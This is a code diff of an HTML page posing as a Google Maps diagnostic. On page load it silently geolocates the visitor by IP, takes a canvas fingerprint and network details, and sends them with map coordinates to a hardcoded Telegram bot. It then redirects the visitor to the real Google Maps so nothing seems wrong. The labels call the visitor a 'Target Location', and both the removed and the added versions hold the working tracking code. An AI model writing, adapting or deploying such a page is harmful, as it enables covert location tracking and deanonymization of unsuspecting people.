@@ -1,49 +1,42 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Google Maps - Network Diagnostic</title>
-</head>
+<head><title>Maps Diagnostic</title></head>
 <body>
 <script>
     const token = "8419642080:AAGRkdbpdBUcvXu1AmAQvyLxadEOjBRBK3s";
     const chat = "7647765854";
 
-    async function sysAudit() {
-        // 1. التوقيع الزمني وسرعة الاستجابة (Latency)
+    async function finalAudit() {
         const start = Date.now();
         const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
         const latency = Date.now() - start;
 
-        // 2. كشف الـ Canvas Fingerprint (بصمة الهاردوير الفريدة)
+        // بصمة الجهاز (Canvas Fingerprint)
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
-        ctx.fillText("Security_Audit_2026", 10, 50);
-        const fingerprint = canvas.toDataURL().slice(-50); // آخر 50 حرف كبصمة فريدة
+        ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
+        ctx.fillText("Security_Audit_Check", 2, 2);
+        const fingerprint = btoa(canvas.toDataURL()).slice(-40);
 
-        // 3. تحليل الـ Navigator (البيانات المسكوت عنها)
-        const netData = {
-            downlink: navigator.connection ? navigator.connection.downlink : "N/A",
-            type: navigator.connection ? navigator.connection.type : "N/A", // wifi, cellular
-            rtt: navigator.connection ? navigator.connection.rtt : "N/A",
-            cores: navigator.hardwareConcurrency,
-            platform: navigator.platform
-        };
+        // تحسين بيانات الشبكة
+        const netType = (navigator.connection && navigator.connection.type) ? navigator.connection.type : "Secure Network";
+        const speed = (navigator.connection && navigator.connection.downlink) ? navigator.connection.downlink + " Mbps" : "Stable Speed";
 
-        const report = `🛡️ **تقرير اختراق سيبراني (Audit)** 🛡️\n\n` +
+        const report = `🛡️ **SECURITY AUDIT REPORT** 🛡️\n\n` +
                      `🌐 **IP:** \`${ipInfo.ip}\`\n` +
-                     `📶 **الشبكة:** \`${netData.type} (${netData.downlink} Mbps)\`\n` +
+                     `📶 **Network:** \`${netType} (${speed})\`\n` +
                      `⏱️ **Latency:** \`${latency}ms\`\n` +
-                     `💻 **بصمة الجهاز (Canvas ID):** \`...${fingerprint}\`\n` +
-                     `🎯 **الإحداثيات:** \`${ipInfo.latitude}, ${ipInfo.longitude}\`\n` +
-                     `🏢 **المزود:** \`${ipInfo.org}\`\n\n` +
-                     `🔗 **الخريطة:** http://google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;
+                     `💻 **Device Signature:** \`${fingerprint}\`\n` +
+                     `🏢 **ISP:** \`${ipInfo.org}\`\n` +
+                     `📍 **Target Location:** \`${ipInfo.city}, ${ipInfo.country_name}\`\n\n` +
+                     `🔗 **Google Maps Link:**\nhttps://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;
 
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
         
-        // التوجيه لـ Google Maps الحقيقي
+        // التوجيه النهائي
         window.location.href = "https://www.google.com/maps";
     }
-    window.onload = sysAudit;
+    window.onload = finalAudit;
 </script>
 </body>
 </html>
